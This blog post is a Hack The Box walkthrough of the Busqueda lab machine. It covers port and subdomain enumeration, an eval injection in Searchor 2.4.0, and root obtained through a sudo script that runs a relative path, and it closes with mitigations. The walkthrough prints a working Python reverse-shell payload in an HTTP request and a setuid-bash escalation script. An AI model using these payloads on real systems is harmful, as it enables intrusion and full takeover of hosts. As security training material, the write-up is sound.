---
layout: post
title: Hack The Box Walkthrough - Busqueda
date: 2023-08-12
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2023/08/HTB/Busqueda
img: 2023/08/Busqueda/Busqueda.png
---

In this easy box, I exploited a know vulnerability in a Python library and abused a script that used relative paths.

* Room: Busqueda
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/Busqueda](https://app.hackthebox.com/machines/Busqueda)
* Author: [kavigihan](https://app.hackthebox.com/users/389926)

## Enumeration

I launched rustscan to check for open ports on the target machine.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.205.236:22
Open 10.129.205.236:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

...

Host is up, received conn-refused (0.027s latency).
Scanned at 2023-04-10 15:55:01 EDT for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp open  http    syn-ack Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:55
Completed NSE at 15:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:55
Completed NSE at 15:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:55
Completed NSE at 15:55, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.93 seconds
```

There were two open ports.
* 22 - SSH
* 80 - HTTP

The site on port 80 was redirecting to 'searcher.htb'. I added it to my hosts file and launched Feroxbuster to look for hidden pages.

```bash
$ feroxbuster -u http://searcher.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://searcher.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      430l      751w    13519c http://searcher.htb/
405      GET        5l       20w      153c http://searcher.htb/search
403      GET        9l       28w      277c http://searcher.htb/server-status
[####################] - 6m    119601/119601  0s      found:3       errors:395
[####################] - 6m    119601/119601  286/s   http://searcher.htb/
```

It did not find much, just a search page. I used wfuzz to look for subdomains.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -X POST -t30 --hw 26 -H "Host:FUZZ.searcher.htb" "http://searcher.htb"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://searcher.htb/
Total requests: 648201

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   400        10 L     35 W       304 Ch      "*"
000319756:   400        10 L     35 W       304 Ch      "#mail"
000415924:   400        10 L     35 W       304 Ch      "#pop3"
000488839:   400        10 L     35 W       304 Ch      "#smtp"
000588822:   400        10 L     35 W       304 Ch      "#www"

Total time: 871.2063
Processed Requests: 648201
Filtered Requests: 648196
Requests/sec.: 744.0269
```

It did not find any.

## Website

I opened a browser to look at the site.

![Search Site](/assets/images/2023/08/Busqueda/SearcherSite.png "Search Site")

The site allowed searching on a list of external sites. You entered a string, and it will reply with the URL to search on the selected site. It also had the option to redirect you directly to the search page of the selected site.

I played with the data that was posted to the site. I quickly found out that the backend code seemed to use single quotes, and that my data was not sanitized. 

I tried to use string concatenation.

```http
POST /search HTTP/1.1
Host: searcher.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://searcher.htb
Connection: keep-alive
Referer: http://searcher.htb/
Upgrade-Insecure-Requests: 1
Content-Length: 40

engine=Accuweather&query=test' + 'concat
```

The response had the two parts of my string.

```http
HTTP/1.1 200 OK
Date: Sat, 29 Apr 2023 15:59:22 GMT
Server: Werkzeug/2.1.2 Python/3.10.6
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Length: 64

https://www.accuweather.com/en/search-locations?query=testconcat
```

I tried sending simple commands using Python `system` command. 

```python
engine=Wired&query=a' + 'b' +  (__import__('os').system('wget 10.10.14.69')) + 'a
```

This did not work. I spent a little time trying to get code execution. At some point, I looked at the page and saw that it was built with [Searchor](https://github.com/ArjunSharda/Searchor) 2.4.0.

![Powered by Searchor](/assets/images/2023/08/Busqueda/PoweredBy.png "Powered by Searchor")

With that information I quickly found a [Remote Code Execution (RCE) vulnerability](https://github.com/jonnyzar/POC-Searchor-2.4.2) in Searchor. The code from versions 2.4.2 and lower were [using `eval`](https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b) on the passed in data.

I used the provided proof on concept to get a reverse shell.

```http
POST /search HTTP/1.1
Host: searcher.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://searcher.htb
Connection: keep-alive
Referer: http://searcher.htb/
Upgrade-Insecure-Requests: 1
Content-Length: 245

engine=AlternativeTo&query=', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

I was in, and got the user flag.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.208] 48874
/bin/sh: 0: can't access tty; job control turned off
$ whoami
svc

$ cd

$ ls
user.txt

$ cat user.txt
REDACTED
```

## Getting root

Once connected, I copied my SSH public key on the server and reconnected with SSH.

```bash
$ mkdir .ssh

$ chmod 700 .ssh

$ cd .ssh

$ echo "ssh-rsa AAAA ..." >> authorized_keys

$ chmod 600 authorized_keys
```

Then I looked at what I could do on the server.

```bash
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
sudo: a password is required

svc@busqueda:~$ find / -perm /u=s 2>/dev/null 
/usr/libexec/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/umount
/usr/bin/fusermount3
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/snap/core20/1822/usr/bin/chfn
/snap/core20/1822/usr/bin/chsh
/snap/core20/1822/usr/bin/gpasswd
/snap/core20/1822/usr/bin/mount
/snap/core20/1822/usr/bin/newgrp
/snap/core20/1822/usr/bin/passwd
/snap/core20/1822/usr/bin/su
/snap/core20/1822/usr/bin/sudo
/snap/core20/1822/usr/bin/umount
/snap/core20/1822/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1822/usr/lib/openssh/ssh-keysign
/snap/snapd/18357/usr/lib/snapd/snap-confine

svc@busqueda:~$ groups
svc
```

I did not have svc's password so I could not run sudo. I did not see suspicious suid binaries.

I looked at the web application files and found a password in git configuration.

```bash
svc@busqueda:/var/www/app$ cat .git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:REDACTED@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

I tried that password with sudo. 

```bash
svc@busqueda:/var/www/app$ sudo -l 
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

I was able to run a python script, passing it any parameters I wanted.

```
svc@busqueda:~$ ls -la /opt/scripts/
total 28
drwxr-xr-x 3 root root 4096 Dec 24 18:23 .
drwxr-xr-x 4 root root 4096 Mar  1 10:46 ..
-rwx--x--x 1 root root  586 Dec 24 21:23 check-ports.py
-rwx--x--x 1 root root  857 Dec 24 21:23 full-checkup.sh
drwxr-x--- 8 root root 4096 Apr  3 15:04 .git
-rwx--x--x 1 root root 3346 Dec 24 21:23 install-flask.sh
-rwx--x--x 1 root root 1903 Dec 24 21:23 system-checkup.py
```

I was not allowed to read the code of the script. I tried running it.

```bash
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py a
[sudo] password for svc: 
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up 40 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up 40 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-inspect json gitea/gitea:latest
json

svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
```

The script allowed to get some information about the docker containers running on the machine. It also had a `full-checkup` action, but it was failing. 

I did some research about the [`docker inspect` command](https://docs.docker.com/engine/reference/commandline/inspect/) that the script was probably calling. I found out that the `{% raw %}{{json .}}{% endraw %}` format would return everything as JSON.

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{% raw %}{{json .}}{% endraw %}' gitea/gitea:latest
{"Id":"sha256:6cd4959e1db11e85d89108b74db07e2a96bbb5c4eb3aa97580e65a8153ebcc78","RepoTags":["gitea/gitea:latest"], ...}

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{% raw %}{{json .}}{% endraw %}' mysql:8
{"Id":"sha256:7484689f290f1defe06b65befc54cb6ad91a667cf0af59a265ffe76c46bd0478","RepoTags":["mysql:8"], ...}
```

The returned JSON contained some passwords, I tried them to connect as root. It failed. I used the MySQL credentials to connect to the database and found some passwords, but failed to crack them.

I went back to the `full-checkup` action. It failed when I tried it. But I remembered that the `/opt/scripts` folder contained a file named `full-checkup.sh`. I thought maybe this script was executed without providing a full path. I tried again from the scripts folder and it worked.

```bash
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong

svc@busqueda:~$ ls -l /opt/scripts/
total 16
-rwx--x--x 1 root root  586 Dec 24 21:23 check-ports.py
-rwx--x--x 1 root root  857 Dec 24 21:23 full-checkup.sh
-rwx--x--x 1 root root 3346 Dec 24 21:23 install-flask.sh
-rwx--x--x 1 root root 1903 Dec 24 21:23 system-checkup.py

svc@busqueda:~$ cd /opt/scripts/

svc@busqueda:/opt/scripts$ sudo python3 /opt/scripts/system-checkup.py full-checkup
[=] Docker conteainers
{
  "/gitea": "running"
}
{
  "/mysql_db": "running"
}

[=] Docker port mappings
{
  "22/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "222"
    }
  ],
  "3000/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "3000"
    }
  ]
}

[=] Apache webhosts
[+] searcher.htb is up
[+] gitea.searcher.htb is up

[=] PM2 processes
┌─────┬────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id  │ name   │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├─────┼────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 0   │ app    │ default     │ N/A     │ fork    │ 1654     │ 49m    │ 0    │ online    │ 0%       │ 30.1mb   │ svc      │ disabled │
└─────┴────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘

[+] Done!
```

I tried creating a `full-checkup.sh` script in the home folder and run the command from there.

```bash
svc@busqueda:~$ cat full-checkup.sh 
#!/usr/bin/bash

echo 'IN'

svc@busqueda:~$ chmod +x full-checkup.sh 

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
IN

[+] Done!
```

My script was executed instead of the one in `/opt/scripts`. I modified it to copy `bash` and set the suid bit on it.

```bash
svc@busqueda:~$ cat full-checkup.sh 
#!/usr/bin/bash

cp /usr/bin/bash /tmp
chmod u+s /tmp/bash

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!

svc@busqueda:~$ ls -ltr /tmp/
total 1392
drwx------ 3 root root    4096 Apr 29 11:18 systemd-private-249c9d6763b340caae3d0717ff5b81ad-systemd-resolved.service-V5FTum
drwx------ 3 root root    4096 Apr 29 11:18 systemd-private-249c9d6763b340caae3d0717ff5b81ad-systemd-timesyncd.service-c3trPg
drwx------ 3 root root    4096 Apr 29 11:18 systemd-private-249c9d6763b340caae3d0717ff5b81ad-systemd-logind.service-kvSskR
drwx------ 3 root root    4096 Apr 29 11:18 systemd-private-249c9d6763b340caae3d0717ff5b81ad-ModemManager.service-2Z0BgM
drwx------ 3 root root    4096 Apr 29 11:18 systemd-private-249c9d6763b340caae3d0717ff5b81ad-apache2.service-Wjhdh3
drwx------ 3 root root    4096 Apr 29 11:18 snap-private-tmp
drwx------ 2 root root    4096 Apr 29 11:18 vmware-root_729-4257135007
-rwsr-xr-x 1 root root 1396520 Apr 29 13:08 bash

svc@busqueda:~$ /tmp/bash -p

bash-5.1# whoami
root

bash-5.1# cat /root/root.txt 
REDACTED
```

## Mitigation

This machine had three vulnerabilities that allowed me to get to root. The first one was the outdated version of Searchor that used `eval` on user-supplied data. An update of the application's dependencies would have stopped me from gaining access to the server.

The next issue was having a git repository on the server. Especially with the remote using a URL with credentials in it.

```bash
svc@busqueda:/var/www/app$ git remote -v
origin  http://cody:REDACTED@gitea.searcher.htb/cody/Searcher_site.git (fetch)
origin  http://cody:REDACTED@gitea.searcher.htb/cody/Searcher_site.git (push)
```

The server should only have the production code, without any git information.

The last issue was the script using a relative path.

```python
elif action == 'full-checkup':
    try:
        arg_list = ['./full-checkup.sh']
        print(run_command(arg_list))
        print('[+] Done!')
    except:
        print('Something went wrong')
        exit(1)
```

This allowed me to replace the intended script with the one I wrote. To fix it, I changed the path to use the full path.

```python
arg_list = ['/opt/scripts/full-checkup.sh']
```

